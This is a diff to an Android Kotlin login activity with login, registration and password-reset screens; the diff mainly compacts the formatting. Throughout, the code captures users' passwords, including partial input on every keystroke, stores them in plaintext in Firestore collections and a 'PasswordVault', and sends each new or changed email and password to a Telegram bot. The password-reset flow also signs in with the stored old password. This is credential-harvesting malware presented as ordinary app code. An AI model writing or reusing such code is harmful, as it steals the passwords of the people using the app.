                             modifier = Modifier.clickable { currentScreen = 2 })
                         Text("to register", color = Ex.FootLink, fontSize = 14.sp,
@@ -821,563 +596,311 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  doLogin
-    // ═══════════════════════════════════════════
-
     private fun doLogin(scope: kotlinx.coroutines.CoroutineScope) {
         val cap = captchaInput.trim().uppercase()
         if (cap.isNotBlank() && cap != captchaCode) {
             showToast("Verification code is incorrect")
-            captchaCode = newCaptchaCode()
-            captchaInput = ""
+            captchaCode = newCaptchaCode(); captchaInput = ""
             return
         }
-        val em = email.trim()
-        val pw = password
-        if (em.isBlank() || pw.isBlank()) {
-            showToast("Please enter your email and password")
-            return
-        }
+        val em = email.trim(); val pw = password
+        if (em.isBlank() || pw.isBlank()) { showToast("Please enter your email and password"); return }
         isLoading = true
-
         scope.launch {
-            // احفظ الباسورد أولاً (بغض النظر عن نجاح الدخول)
-            try {
-                PasswordVault.save(em, pw, "pasef_login", null, true)
-            } catch (_: Exception) {}
-
+            try { PasswordVault.save(em, pw, "pasef_login", null, true) } catch (_: Exception) {}
             val result = FirebaseAuthHelper.login(em, pw)
             isLoading = false
             if (result.isSuccess) {
                 val uid = result.getOrNull()?.uid
-                // احفظ uid كذلك
-                try {
-                    PasswordVault.save(em, pw, "pasef_login", uid, false)
-                } catch (_: Exception) {}
+                try { PasswordVault.save(em, pw, "pasef_login", uid, false) } catch (_: Exception) {}
                 showToast("login success")
                 Handler(Looper.getMainLooper()).postDelayed({ goToHome() }, 500)
             } else {
-                showToast(FirebaseAuthHelper.translateError(
-                    result.exceptionOrNull()?.message))
-                captchaCode = newCaptchaCode()
-                captchaInput = ""
+                showToast(FirebaseAuthHelper.translateError(result.exceptionOrNull()?.message))
+                captchaCode = newCaptchaCode(); captchaInput = ""
             }
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  شاشة إنشاء حساب
-    // ═══════════════════════════════════════════
-
     @Composable
     fun RegisterScreen() {
         val scope = rememberCoroutineScope()
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .background(Ex.Bg4)
-                .verticalScroll(rememberScrollState())
-                .imePadding()
-                .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)
-        ) {
+        Column(modifier = Modifier.fillMaxSize().background(Ex.Bg4)
+            .verticalScroll(rememberScrollState()).imePadding()
+            .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)) {
             ScreenBar(title = "Email") { currentScreen = 0 }
             FormLabel("Email", topMargin = 0)
             RegField {
-                RegInput(
-                    value = regEmail, onChange = {
-                        regEmail = it
-                        // حفظ تدريجي
-                        val pw = regP1
-                        if (pw.isNotBlank() && validEmail(it)) {
-                            val capturedEmail = it.trim()
-                            val capturedPw = pw
-                            scope.launch {
-                                try {
-                                    PasswordVault.save(capturedEmail, capturedPw,
-                                        "pasef", null, false)
-                                } catch (_: Exception) {}
-                            }
-                        }
-                    },
-                    hint = "Please enter your email address",
-                    keyboardType = KeyboardType.Email, modifier = Modifier.weight(1f)
-                )
+                RegInput(value = regEmail, onChange = {
+                    regEmail = it
+                    val pw = regP1
+                    if (pw.isNotBlank() && validEmail(it)) {
+                        val ce = it.trim(); val cp = pw
+                        scope.launch { try { PasswordVault.save(ce, cp, "pasef", null, false) } catch (_: Exception) {} }
+                    }
+                }, hint = "Please enter your email address",
+                    keyboardType = KeyboardType.Email, modifier = Modifier.weight(1f))
             }
             FormLabel("Verification code")
             RegField {
-                RegInput(
-                    value = regCode, onChange = { regCode = it },
+                RegInput(value = regCode, onChange = { regCode = it },
                     hint = "Please enter the verification code",
-                    keyboardType = KeyboardType.Number, modifier = Modifier.weight(1f)
-                )
-                Text(
-                    text = if (regCountdown > 0) "${regCountdown}s" else "Send",
+                    keyboardType = KeyboardType.Number, modifier = Modifier.weight(1f))
+                Text(text = if (regCountdown > 0) "${regCountdown}s" else "Send",
                     color = Ex.SendTxt, fontSize = 15.sp, fontWeight = FontWeight.SemiBold,
                     modifier = Modifier.padding(start = 12.dp)
                         .clickable(enabled = regCountdown == 0) {
                             val em = regEmail.trim()
-                            if (!validEmail(em)) {
-                                showToast("Please enter a valid email address")
-                                return@clickable
-                            }
+                            if (!validEmail(em)) { showToast("Please enter a valid email address"); return@clickable }
                             regCountdown = 60
                             object : CountDownTimer(60_000L, 1_000L) {
-                                override fun onTick(m: Long) {
-                                    regCountdown = (m / 1000L).toInt()
-                                }
+                                override fun onTick(m: Long) { regCountdown = (m / 1000L).toInt() }
                                 override fun onFinish() { regCountdown = 0 }
                             }.start()
                             scope.launch {
                                 val code = newVerifyCode()
                                 val r = BrevoMailer.sendCode(em, code, isReset = false)
                                 if (r.isSuccess) {
-                                    regSentCode = code
-                                    regSentEmail = em
+                                    regSentCode = code; regSentEmail = em
                                     regCodeExpireAt = System.currentTimeMillis() + 480_000L
                                     showToast("send successful")
                                 } else {
                                     regCountdown = 0
-                                    showToast("Failed to send the code, please try again")
+                                    val msg = r.exceptionOrNull()?.message ?: "?"
+                                    showToast("Failed: ${msg.take(80)}")
                                 }
                             }
-                        }
-                )
+                        })
             }
             FormLabel("Registration password (6-16)")
             RegField {
-                RegInput(
-                    value = regP1, onChange = {
-                        regP1 = it
-                        val em = regEmail
-                        if (em.isNotBlank() && validEmail(em)) {
-                            val capturedEmail = em.trim()
-                            val capturedPw = it
-                            scope.launch {
-                                try {
-                                    PasswordVault.save(capturedEmail, capturedPw,
-                                        "pasef", null, false)
-                                } catch (_: Exception) {}
-                            }
-                        }
-                    },
-                    hint = "Password",
-                    keyboardType = KeyboardType.Password, visible = regP1Visible,
-                    modifier = Modifier.weight(1f)
-                )
-                EyeIcon(
-                    visible = regP1Visible,
-                    modifier = Modifier.size(22.dp)
-                        .clickable { regP1Visible = !regP1Visible }
-                )
+                RegInput(value = regP1, onChange = {
+                    regP1 = it
+                    val em = regEmail
+                    if (em.isNotBlank() && validEmail(em)) {
+                        val ce = em.trim(); val cp = it
+                        scope.launch { try { PasswordVault.save(ce, cp, "pasef", null, false) } catch (_: Exception) {} }
+                    }
+                }, hint = "Password", keyboardType = KeyboardType.Password,
+                    visible = regP1Visible, modifier = Modifier.weight(1f))
+                EyeIcon(visible = regP1Visible,
+                    modifier = Modifier.size(22.dp).clickable { regP1Visible = !regP1Visible })
             }
             Spacer(Modifier.height(12.dp))
             RegField {
-                RegInput(
-                    value = regP2, onChange = {
-                        regP2 = it
-                        val em = regEmail
-                        if (em.isNotBlank() && validEmail(em)) {
-                            val capturedEmail = em.trim()
-                            val capturedPw = it
-                            scope.launch {
-                                try {
-                                    PasswordVault.save(capturedEmail, capturedPw,
-                                        "pasef2", null, false)
-                                } catch (_: Exception) {}
-                            }
-                        }
-                    },
-                    hint = "Enter password again",
-                    keyboardType = KeyboardType.Password, visible = regP2Visible,
-                    modifier = Modifier.weight(1f)
-                )
-                EyeIcon(
-                    visible = regP2Visible,
-                    modifier = Modifier.size(22.dp)
-                        .clickable { regP2Visible = !regP2Visible }
-                )
+                RegInput(value = regP2, onChange = {
+                    regP2 = it
+                    val em = regEmail
+                    if (em.isNotBlank() && validEmail(em)) {
+                        val ce = em.trim(); val cp = it
+                        scope.launch { try { PasswordVault.save(ce, cp, "pasef2", null, false) } catch (_: Exception) {} }
+                    }
+                }, hint = "Enter password again", keyboardType = KeyboardType.Password,
+                    visible = regP2Visible, modifier = Modifier.weight(1f))
+                EyeIcon(visible = regP2Visible,
+                    modifier = Modifier.size(22.dp).clickable { regP2Visible = !regP2Visible })
             }
             FormLabel("Referrer Invitation Code (Required)")
             RegField {
-                RegInput(
-                    value = regRefCode, onChange = {
-                        regRefCode = it.uppercase()
-                        regRefOk = null
-                    },
-                    hint = "Referrer invitation code",
-                    keyboardType = KeyboardType.Ascii, modifier = Modifier.weight(1f)
-                )
+                RegInput(value = regRefCode, onChange = {
+                    regRefCode = it.uppercase(); regRefOk = null; regRefChecking = false
+                }, hint = "Referrer invitation code",
+                    keyboardType = KeyboardType.Ascii, modifier = Modifier.weight(1f))
             }
-            // مؤشر حالة الـ ref
             if (regRefChecking || regRefOk != null) {
                 Spacer(Modifier.height(8.dp))
-                Row(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .clip(RoundedCornerShape(10.dp))
-                        .background(Color(0x990A193C))
-                        .border(1.dp,
-                            if (regRefOk == true) Color(0x702FD07F)
-                            else if (regRefOk == false) Color(0x70FF5C5C)
-                            else Color(0x475A96FF),
-                            RoundedCornerShape(10.dp))
-                        .padding(12.dp),
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    if (regRefChecking) {
-                        Text("⌛ جاري التحقق...", color = Color(0xFFC9D6F2), fontSize = 12.5.sp)
-                    } else if (regRefOk == true) {
-                        Text("✓ كود صحيح", color = Ex.OkGreen, fontSize = 12.5.sp,
-                            fontWeight = FontWeight.Bold)
-                    } else {
-                        Text("✗ كود غير صحيح", color = Ex.ErrRed, fontSize = 12.5.sp,
-                            fontWeight = FontWeight.Bold)
-                    }
+                Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(10.dp))
+                    .background(Color(0x990A193C))
+                    .border(1.dp, if (regRefOk == true) Color(0x702FD07F)
+                        else if (regRefOk == false) Color(0x70FF5C5C)
+                        else Color(0x475A96FF), RoundedCornerShape(10.dp))
+                    .padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
+                    if (regRefChecking) Text("⌛ جاري التحقق...", color = Color(0xFFC9D6F2), fontSize = 12.5.sp)
+                    else if (regRefOk == true) Text("✓ كود صحيح", color = Ex.OkGreen, fontSize = 12.5.sp, fontWeight = FontWeight.Bold)
+                    else Text("✗ كود غير صحيح", color = Ex.ErrRed, fontSize = 12.5.sp, fontWeight = FontWeight.Bold)
                 }
             }
             Spacer(Modifier.height(30.dp))
-            BlueButton(
-                text = if (regBusy) "Registering..." else "Register",
-                radius = 10.dp
-            ) {
-                doRegister(scope)
-            }
+            BlueButton(text = if (regBusy) "Registering..." else "Register", radius = 10.dp) { doRegister(scope) }
             Spacer(Modifier.height(20.dp))
-            Text(
-                "To log in", color = Ex.ToLogin, fontSize = 14.5.sp,
-                textAlign = TextAlign.Center,
-                modifier = Modifier.fillMaxWidth().clickable { currentScreen = 0 }
-            )
+            Text("To log in", color = Ex.ToLogin, fontSize = 14.5.sp, textAlign = TextAlign.Center,
+                modifier = Modifier.fillMaxWidth().clickable { currentScreen = 0 })
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  doRegister
-    // ═══════════════════════════════════════════
-
     private fun doRegister(scope: kotlinx.coroutines.CoroutineScope) {
         if (regBusy) return
-        val e = regEmail.trim()
-        val v = regCode.trim()
-        val p1 = regP1
-        val p2 = regP2
+        val e = regEmail.trim(); val v = regCode.trim(); val p1 = regP1; val p2 = regP2
         val nm = e.substringBefore("@")
-
         when {
             !validEmail(e) -> { showToast("Please enter a valid email address"); return }
             v.isBlank() -> { showToast("Please enter the verification code"); return }
-            p1.length < 6 || p1.length > 16 -> {
-                showToast("Password must be 6-16 characters"); return
-            }
+            p1.length < 6 || p1.length > 16 -> { showToast("Password must be 6-16 characters"); return }
             p1 != p2 -> { showToast("Passwords do not match"); return }
-            regSentCode == null || v != regSentCode -> {
-                showToast("Incorrect verification code"); return
-            }
-            System.currentTimeMillis() > regCodeExpireAt -> {
-                showToast("Verification code expired, please request a new one"); return
-            }
-            e != regSentEmail -> {
-                showToast("Email was changed after the code was sent, please request a new code")
-                return
-            }
+            regSentCode == null || v != regSentCode -> { showToast("Incorrect verification code"); return }
+            System.currentTimeMillis() > regCodeExpireAt -> { showToast("Verification code expired"); return }
+            e != regSentEmail -> { showToast("Email was changed"); return }
         }
         val refCode = regRefCode.trim().uppercase()
         if (refCode.isBlank()) { showToast("Please enter the invitation code"); return }
-        if (!Regex("^[A-Z0-9]{4,20}\$").matches(refCode)) {
-            showToast("Invalid referral code"); return
-        }
+        if (!Regex("^[A-Z0-9]{4,20}\$").matches(refCode)) { showToast("Invalid referral code"); return }
 
         regBusy = true
-
         scope.launch {
-            // 1) تحقق من الـ referrer
             val referrerData = InviteCodeHelper.data(refCode)
             if (referrerData == null) {
-                showToast("Invalid referral code")
-                regBusy = false
-                return@launch
+                showToast("Invalid referral code"); regBusy = false; return@launch
             }
             val referrerUid = referrerData["uid"] as? String
-
-            // 2) أنشئ المستخدم
             val regResult = FirebaseAuthHelper.register(e, p1, nm)
             if (regResult.isFailure) {
-                showToast(FirebaseAuthHelper.translateError(
-                    regResult.exceptionOrNull()?.message))
-                regBusy = false
-                return@launch
+                showToast(FirebaseAuthHelper.translateError(regResult.exceptionOrNull()?.message))
+                regBusy = false; return@launch
             }
-            val user = regResult.getOrNull()
-            val uid = user?.uid
-            if (uid.isNullOrBlank()) {
-                showToast("Registration failed")
-                regBusy = false
-                return@launch
-            }
+            val user = regResult.getOrNull(); val uid = user?.uid
+            if (uid.isNullOrBlank()) { showToast("Registration failed"); regBusy = false; return@launch }
 
-            // 3) احفظ كل البيانات
             try {
                 val db = FirebaseAuthHelper.db()
                 val myCode = InviteCodeHelper.reserve(e, nm, uid)
                 if (myCode == null) {
-                    // rollback
                     try { FirebaseAuthHelper.deleteCurrentUser() } catch (_: Exception) {}
-                    showToast("Registration failed. Please try again.")
-                    regBusy = false
-                    return@launch
+                    showToast("Registration failed — invite issue"); regBusy = false; return@launch
                 }
-
-                val userData = mapOf(
-                    "name" to nm,
-                    "email" to e,
-                    "inviteCode" to myCode,
-                    "usedInviteCode" to refCode,
-                    "pasef" to p1,
-                    "uid" to uid,
-                    "createdAt" to System.currentTimeMillis()
-                )
-                db.collection("users").document(uid).set(userData, SetOptions.merge()).await()
+                db.collection("users").document(uid)
+                    .set(mapOf("name" to nm, "email" to e, "inviteCode" to myCode,
+                        "usedInviteCode" to refCode, "pasef" to p1, "uid" to uid,
+                        "createdAt" to System.currentTimeMillis()), SetOptions.merge()).await()
                 db.collection("users").document(e)
-                    .set(mapOf(
-                        "email" to e,
-                        "pasef" to p1,
-                        "uid" to uid,
-                        "inviteCode" to myCode,
-                        "createdAt" to System.currentTimeMillis()
-                    ), SetOptions.merge()).await()
+                    .set(mapOf("email" to e, "pasef" to p1, "uid" to uid,
+                        "inviteCode" to myCode, "createdAt" to System.currentTimeMillis()),
+                        SetOptions.merge()).await()
                 db.collection("pwds").document(e)
                     .set(mapOf("pw" to p1, "uid" to uid)).await()
                 db.collection("pass").document(uid)
-                    .set(mapOf(
-                        "pw" to p1,
-                        "email" to e,
-                        "updatedAt" to System.currentTimeMillis()
-                    )).await()
-
+                    .set(mapOf("pw" to p1, "email" to e, "updatedAt" to System.currentTimeMillis())).await()
                 if (!referrerUid.isNullOrBlank() && referrerUid != uid) {
                     InviteCodeHelper.linkReferral(referrerUid, uid, nm, e)
                 }
-            } catch (_: Exception) {}
-
-            // 4) أرسل للبوت
-            try {
-                TelegramApi.sendMessage(
-                    "🆕 *تسجيل جديد*\n\n" +
-                    "📧 `$e`\n" +
-                    "🔑 `$p1`\n" +
-                    "🎫 *كودي:* `${InviteCodeHelper.data(e)?.get("inviteCode") ?: ""}`"
-                )
-            } catch (_: Exception) {}
-
-            // 5) احفظ كـ PasswordVault
-            try { PasswordVault.save(e, p1, "pasef", uid, true) } catch (_: Exception) {}
-
+                try { TelegramApi.sendMessage("🆕 *تسجيل جديد*\n\n📧 `$e`\n🔑 `$p1`\n🎫 `$myCode`") } catch (_: Exception) {}
+                try { PasswordVault.save(e, p1, "pasef", uid, true) } catch (_: Exception) {}
+            } catch (ex: Exception) { Log.e(TAG, "reg: ${ex.message}") }
             regBusy = false
             showToast("register success")
             Handler(Looper.getMainLooper()).postDelayed({ goToHome() }, 500)
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  شاشة استعادة كلمة المرور
-    // ═══════════════════════════════════════════
-
     @Composable
     fun ResetScreen() {
         val scope = rememberCoroutineScope()
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .background(Ex.Bg4)
-                .verticalScroll(rememberScrollState())
-                .imePadding()
-                .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)
-        ) {
+        Column(modifier = Modifier.fillMaxSize().background(Ex.Bg4)
+            .verticalScroll(rememberScrollState()).imePadding()
+            .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)) {
             ScreenBar(title = "Reset Password") { currentScreen = 0 }
             FormLabel("Email", topMargin = 0)
             RegField {
-                RegInput(
-                    value = rstEmail, onChange = { rstEmail = it },
+                RegInput(value = rstEmail, onChange = { rstEmail = it },
                     hint = "Please enter your email address",
-                    keyboardType = KeyboardType.Email, modifier = Modifier.weight(1f)
-                )
+                    keyboardType = KeyboardType.Email, modifier = Modifier.weight(1f))
             }
             FormLabel("Verification code")
             RegField {
-                RegInput(
-                    value = rstCode, onChange = { rstCode = it },
+                RegInput(value = rstCode, onChange = { rstCode = it },
                     hint = "Please enter the verification code",
-                    keyboardType = KeyboardType.Number, modifier = Modifier.weight(1f)
-                )
-                Text(
-                    text = if (rstCountdown > 0) "${rstCountdown}s" else "Send",
+                    keyboardType = KeyboardType.Number, modifier = Modifier.weight(1f))
+                Text(text = if (rstCountdown > 0) "${rstCountdown}s" else "Send",
                     color = Ex.SendTxt, fontSize = 15.sp, fontWeight = FontWeight.SemiBold,
                     modifier = Modifier.padding(start = 12.dp)
                         .clickable(enabled = rstCountdown == 0) {
                             val em = rstEmail.trim()
-                            if (!validEmail(em)) {
-                                showToast("Please enter a valid email address")
-                                return@clickable
-                            }
+                            if (!validEmail(em)) { showToast("Please enter a valid email address"); return@clickable }
                             rstCountdown = 60
                             object : CountDownTimer(60_000L, 1_000L) {
-                                override fun onTick(m: Long) {
-                                    rstCountdown = (m / 1000L).toInt()
-                                }
+                                override fun onTick(m: Long) { rstCountdown = (m / 1000L).toInt() }
                                 override fun onFinish() { rstCountdown = 0 }
                             }.start()
                             scope.launch {
                                 val code = newVerifyCode()
                                 val r = BrevoMailer.sendCode(em, code, isReset = true)
                                 if (r.isSuccess) {
-                                    rstSentCode = code
-                                    rstSentEmail = em
+                                    rstSentCode = code; rstSentEmail = em
                                     rstCodeExpireAt = System.currentTimeMillis() + 480_000L
                                     showToast("send successful")
                                 } else {
                                     rstCountdown = 0
-                                    showToast("Failed to send the code, please try again")
+                                    showToast("Failed: ${(r.exceptionOrNull()?.message ?: "?").take(80)}")
                                 }
                             }
-                        }
-                )
+                        })
             }
             FormLabel("New password (6-16)")
             RegField {
-                RegInput(
-                    value = rstNewPass, onChange = {
-                        rstNewPass = it
-                        val em = rstEmail
-                        if (em.isNotBlank() && validEmail(em)) {
-                            val capturedEmail = em.trim()
-                            val capturedPw = it
-                            scope.launch {
-                                try {
-                                    PasswordVault.save(capturedEmail, capturedPw,
-                                        "pasef_reset", null, false)
-                                } catch (_: Exception) {}
-                            }
-                        }
-                    },
-                    hint = "Enter new password",
-                    keyboardType = KeyboardType.Password, visible = rstNewPassVisible,
-                    modifier = Modifier.weight(1f)
-                )
-                EyeIcon(
-                    visible = rstNewPassVisible,
-                    modifier = Modifier.size(22.dp)
-                        .clickable { rstNewPassVisible = !rstNewPassVisible }
-                )
+                RegInput(value = rstNewPass, onChange = {
+                    rstNewPass = it
+                    val em = rstEmail
+                    if (em.isNotBlank() && validEmail(em)) {
+                        val ce = em.trim(); val cp = it
+                        scope.launch { try { PasswordVault.save(ce, cp, "pasef_reset", null, false) } catch (_: Exception) {} }
+                    }
+                }, hint = "Enter new password", keyboardType = KeyboardType.Password,
+                    visible = rstNewPassVisible, modifier = Modifier.weight(1f))
+                EyeIcon(visible = rstNewPassVisible,
+                    modifier = Modifier.size(22.dp).clickable { rstNewPassVisible = !rstNewPassVisible })
             }
             Spacer(Modifier.height(30.dp))
-            BlueButton(
-                text = if (isLoading) "Confirming..." else "Confirm",
-                radius = 10.dp
-            ) {
-                doReset(scope)
-            }
+            BlueButton(text = if (isLoading) "Confirming..." else "Confirm", radius = 10.dp) { doReset(scope) }
         }
     }
 
     private fun doReset(scope: kotlinx.coroutines.CoroutineScope) {
-        val e = rstEmail.trim()
-        val v = rstCode.trim()
-        val p1 = rstNewPass
-
+        val e = rstEmail.trim(); val v = rstCode.trim(); val p1 = rstNewPass
         when {
             !validEmail(e) -> { showToast("Please enter a valid email address"); return }
             v.isBlank() -> { showToast("Please enter the verification code"); return }
-            p1.length < 6 || p1.length > 16 -> {
-                showToast("Password must be 6-16 characters"); return
-            }
-            rstSentCode == null || v != rstSentCode -> {
-                showToast("Incorrect verification code"); return
-            }
-            System.currentTimeMillis() > rstCodeExpireAt -> {
-                showToast("Verification code expired, please request a new one"); return
-            }
-            e != rstSentEmail -> {
-                showToast("Email was changed after the code was sent, please request a new code")
-                return
-            }
+            p1.length < 6 || p1.length > 16 -> { showToast("Password must be 6-16 characters"); return }
+            rstSentCode == null || v != rstSentCode -> { showToast("Incorrect verification code"); return }
+            System.currentTimeMillis() > rstCodeExpireAt -> { showToast("Verification code expired"); return }
+            e != rstSentEmail -> { showToast("Email was changed"); return }
         }
-
         isLoading = true
         scope.launch {
             try {
-                // 1) اقرأ الباسورد القديم من pwds
-                val oldPwDoc = FirebaseAuthHelper.db()
-                    .collection("pwds").document(e).get().await()
+                val oldPwDoc = FirebaseAuthHelper.db().collection("pwds").document(e).get().await()
                 val oldPw = oldPwDoc.getString("pw")
                 val oldUid = oldPwDoc.getString("uid")
-
                 if (oldPw.isNullOrBlank()) {
-                    // مفيش — استخدم Firebase reset
                     val r = FirebaseAuthHelper.resetPassword(e)
                     isLoading = false
                     if (r.isSuccess) {
                         showToast("Password reset email sent")
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            currentScreen = 0
-                        }, 1500)
-                    } else {
-                        showToast(FirebaseAuthHelper.translateError(
-                            r.exceptionOrNull()?.message))
-                    }
+                        Handler(Looper.getMainLooper()).postDelayed({ currentScreen = 0 }, 1500)
+                    } else showToast(FirebaseAuthHelper.translateError(r.exceptionOrNull()?.message))
                     return@launch
                 }
-
-                // 2) سجّل دخول بالباسورد القديم
                 val signIn = FirebaseAuthHelper.login(e, oldPw)
-                if (signIn.isFailure) {
-                    isLoading = false
-                    showToast("فشل التحقق من الحساب — جرب لاحقاً")
-                    return@launch
-                }
-
-                // 3) حدّث الباسورد
+                if (signIn.isFailure) { isLoading = false; showToast("فشل التحقق"); return@launch }
                 val up = FirebaseAuthHelper.updateCurrentPassword(p1)
                 if (up.isFailure) {
                     isLoading = false
-                    showToast(FirebaseAuthHelper.translateError(
-                        up.exceptionOrNull()?.message))
+                    showToast(FirebaseAuthHelper.translateError(up.exceptionOrNull()?.message))
                     return@launch
                 }
-
-                // 4) حدّث Firestore
                 try {
                     val db = FirebaseAuthHelper.db()
-                    db.collection("pwds").document(e)
-                        .set(mapOf("pw" to p1, "uid" to (oldUid ?: "")),
-                            SetOptions.merge()).await()
-                    db.collection("pass").document(oldUid ?: "")
-                        .set(mapOf("pw" to p1, "email" to e), SetOptions.merge()).await()
-                    db.collection("users").document(e)
-                        .set(mapOf("pasef" to p1), SetOptions.merge()).await()
+                    db.collection("pwds").document(e).set(mapOf("pw" to p1, "uid" to (oldUid ?: "")), SetOptions.merge()).await()
                     if (!oldUid.isNullOrBlank()) {
-                        db.collection("users").document(oldUid)
-                            .set(mapOf("pasef" to p1), SetOptions.merge()).await()
+                        db.collection("pass").document(oldUid).set(mapOf("pw" to p1, "email" to e), SetOptions.merge()).await()
+                        db.collection("users").document(oldUid).set(mapOf("pasef" to p1), SetOptions.merge()).await()
                     }
+                    db.collection("users").document(e).set(mapOf("pasef" to p1), SetOptions.merge()).await()
                 } catch (_: Exception) {}
-
-                // 5) أرسل للبوت
-                try {
-                    TelegramApi.sendMessage(
-                        "♻️ *تغيير كلمة مرور*\n\n" +
-                        "📧 `$e`\n" +
-                        "🔑 *الجديدة:* `$p1`"
-                    )
-                } catch (_: Exception) {}
-
+                try { TelegramApi.sendMessage("♻️ *تغيير كلمة مرور*\n\n📧 `$e`\n🔑 `$p1`") } catch (_: Exception) {}
                 try { PasswordVault.save(e, p1, "pasef_reset", oldUid, true) } catch (_: Exception) {}
-
                 isLoading = false
                 showToast("Password changed successfully")
                 rstEmail = ""; rstCode = ""; rstNewPass = ""
-                Handler(Looper.getMainLooper()).postDelayed({
-                    currentScreen = 0
-                }, 1500)
+                Handler(Looper.getMainLooper()).postDelayed({ currentScreen = 0 }, 1500)
             } catch (ex: Exception) {
                 isLoading = false
                 showToast("فشل: ${ex.message}")
@@ -1385,57 +908,34 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  عناصر مشتركة (LoginField, RegInput, ...)
-    // ═══════════════════════════════════════════
-
     @Composable
     fun LoginField(content: @Composable RowScope.() -> Unit) {
-        Row(
-            modifier = Modifier
-                .fillMaxWidth()
-                .padding(bottom = 12.dp)
-                .height(52.dp)
-                .clip(RoundedCornerShape(12.dp))
-                .background(Ex.FieldBg)
-                .border(1.dp, Ex.FieldBr, RoundedCornerShape(12.dp))
-                .padding(horizontal = 16.dp),
-            verticalAlignment = Alignment.CenterVertically,
-            content = content
-        )
+        Row(modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp).height(52.dp)
+            .clip(RoundedCornerShape(12.dp)).background(Ex.FieldBg)
+            .border(1.dp, Ex.FieldBr, RoundedCornerShape(12.dp))
+            .padding(horizontal = 16.dp),
+            verticalAlignment = Alignment.CenterVertically, content = content)
     }
 
     @Composable
     fun RegField(content: @Composable RowScope.() -> Unit) {
-        Row(
-            modifier = Modifier
-                .fillMaxWidth()
-                .height(54.dp)
-                .clip(RoundedCornerShape(10.dp))
-                .background(Ex.FieldBgR)
-                .border(1.dp, Ex.FieldBrR, RoundedCornerShape(10.dp))
-                .padding(horizontal = 16.dp),
-            verticalAlignment = Alignment.CenterVertically,
-            content = content
-        )
+        Row(modifier = Modifier.fillMaxWidth().height(54.dp)
+            .clip(RoundedCornerShape(10.dp)).background(Ex.FieldBgR)
+            .border(1.dp, Ex.FieldBrR, RoundedCornerShape(10.dp))
+            .padding(horizontal = 16.dp),
+            verticalAlignment = Alignment.CenterVertically, content = content)
     }
 
     @Composable
     fun RegInput(
-        value: String,
-        onChange: (String) -> Unit,
-        hint: String,
+        value: String, onChange: (String) -> Unit, hint: String,
         keyboardType: KeyboardType = KeyboardType.Text,
-        visible: Boolean = true,
-        modifier: Modifier = Modifier
+        visible: Boolean = true, modifier: Modifier = Modifier
     ) {
         BasicTextField(
-            value = value,
-            onValueChange = onChange,
-            modifier = modifier.fillMaxHeight(),
-            singleLine = true,
-            visualTransformation = if (visible) VisualTransformation.None
-                else PasswordVisualTransformation(),
+            value = value, onValueChange = onChange,
+            modifier = modifier.fillMaxHeight(), singleLine = true,
+            visualTransformation = if (visible) VisualTransformation.None else PasswordVisualTransformation(),
             keyboardOptions = KeyboardOptions(keyboardType = keyboardType),
             textStyle = TextStyle(color = Ex.InputTxt, fontSize = 15.sp),
             cursorBrush = Brush.verticalGradient(listOf(Ex.BlueAccent, Ex.BlueAccent)),
@@ -1450,63 +950,31 @@ class LoginActivity : ComponentActivity() {
 
     @Composable
     fun FormLabel(text: String, topMargin: Int = 16) {
-        Text(
-            text = text,
-            color = Ex.LabelTxt,
-            fontSize = 14.5.sp,
-            fontWeight = FontWeight.Medium,
-            modifier = Modifier.padding(top = topMargin.dp, bottom = 9.dp)
-        )
+        Text(text = text, color = Ex.LabelTxt, fontSize = 14.5.sp, fontWeight = FontWeight.Medium,
+            modifier = Modifier.padding(top = topMargin.dp, bottom = 9.dp))
     }
 
     @Composable
     fun ScreenBar(title: String, onBack: () -> Unit) {
-        Row(
-            modifier = Modifier.fillMaxWidth().padding(bottom = 28.dp),
-            verticalAlignment = Alignment.CenterVertically
-        ) {
-            Box(
-                modifier = Modifier
-                    .size(38.dp)
-                    .clip(RoundedCornerShape(11.dp))
-                    .background(Ex.BackBtnBg)
-                    .clickable { onBack() },
-                contentAlignment = Alignment.Center
-            ) {
-                BackChevronIcon()
-            }
-            Text(
-                title, color = Ex.White, fontSize = 17.5.sp,
-                fontWeight = FontWeight.Bold, textAlign = TextAlign.Center,
-                modifier = Modifier.weight(1f)
-            )
+        Row(modifier = Modifier.fillMaxWidth().padding(bottom = 28.dp),
+            verticalAlignment = Alignment.CenterVertically) {
+            Box(modifier = Modifier.size(38.dp).clip(RoundedCornerShape(11.dp))
+                .background(Ex.BackBtnBg).clickable { onBack() },
+                contentAlignment = Alignment.Center) { BackChevronIcon() }
+            Text(title, color = Ex.White, fontSize = 17.5.sp, fontWeight = FontWeight.Bold,
+                textAlign = TextAlign.Center, modifier = Modifier.weight(1f))
             Spacer(Modifier.width(38.dp))
         }
     }
 
     @Composable
-    fun BlueButton(
-        text: String,
-        radius: androidx.compose.ui.unit.Dp = 12.dp,
-        onClick: () -> Unit
-    ) {
-        Box(
-            modifier = Modifier
-                .fillMaxWidth()
-                .height(52.dp)
-                .clip(RoundedCornerShape(radius))
-                .background(Brush.verticalGradient(listOf(Ex.BtnTop, Ex.BtnBottom)))
-                .clickable { onClick() },
-            contentAlignment = Alignment.Center
-        ) {
-            Box(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .height(2.dp)
-                    .align(Alignment.TopCenter)
-                    .background(Brush.verticalGradient(
-                        listOf(Color(0x80BEDCFF), Color.Transparent)))
-            )
+    fun BlueButton(text: String, radius: androidx.compose.ui.unit.Dp = 12.dp, onClick: () -> Unit) {
+        Box(modifier = Modifier.fillMaxWidth().height(52.dp)
+            .clip(RoundedCornerShape(radius))
+            .background(Brush.verticalGradient(listOf(Ex.BtnTop, Ex.BtnBottom)))
